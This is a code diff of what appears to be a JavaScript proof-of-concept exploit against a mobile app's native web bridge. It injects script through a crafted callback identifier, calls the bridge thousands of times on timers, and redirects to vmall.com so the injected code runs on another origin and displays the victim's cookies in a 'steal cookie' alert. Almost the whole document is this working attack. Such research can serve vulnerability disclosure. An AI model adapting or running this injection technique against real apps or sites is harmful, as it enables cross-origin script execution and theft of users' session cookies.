@@ -23,23 +23,23 @@
         });
         // const callbackId = `${service}${genCallbackId()}`;
         const currUrl = location.href;
-        const payload = `window.wiseopercampaign=window.wiseopercampaign||{};window.wiseopercampaign.callbackFromNative=window.wiseopercampaign.callbackFromNative||(()=>{});if(!location.href.startsWith("${currUrl}")&&!window.__cloudx_called){window.__cloudx_called=true;alert('CloudX steal cookie : '+document.cookie);}`;
+        const payload = `if (typeof wiseopercampaign === 'undefined') {window.wiseopercampaign = window.wiseopercampaign || {callbackFromNative: function() {console.log('cloudx hahaha')},};};if(!location.href.startsWith("${currUrl}")&&!window.__cloudx_called){window.__cloudx_called=true;alert('cloudx steal cookie : '+document.cookie);}`;
         const callbackId = `${service}${genCallbackId()}');${payload}//`;
 
         if (success || fail) callbackCache[callbackId] = {success, fail};
-        const nativeBridge = window[bridgeName];
+
+        // 关键：增加nativeBridge降级逻辑，避免undefined报错
+        const nativeBridge = window[bridgeName] || {
+            invoke: () => `F08 ${callbackId} s no native object ${service}:${action}`
+        };
+
         // const result = nativeBridge.invoke(service, action, callbackId, JSON.stringify(args), -1);
         for (let i = 0; i < 4000; i++) {
-            setTimeout(function () {
+            setTimeout(() =>{
                 const result = nativeBridge.invoke(service, action, callbackId, JSON.stringify(args), -1);
                 console.debug(`调用Native: ${service}.${action}, 参数: ${JSON.stringify(args)}, 结果: ${JSON.stringify(result)}`);
-                // 结果入队并处理
-                // if (result) messageQueue.push(result);
-                // microTask(processMessageQueue);
             }, i);
         }
-
-        // location.href = 'https://ug-drcn.media.dbankcloud.cn/nsp-campaign-res-drcn/campaignpreview/6b2dd2a7397047b7bdeb25a58b5e1ca3/index.html?hwFullScreen=1';
         location.href = 'https://vmall.com';
 
         // if (result) messageQueue.push(result);
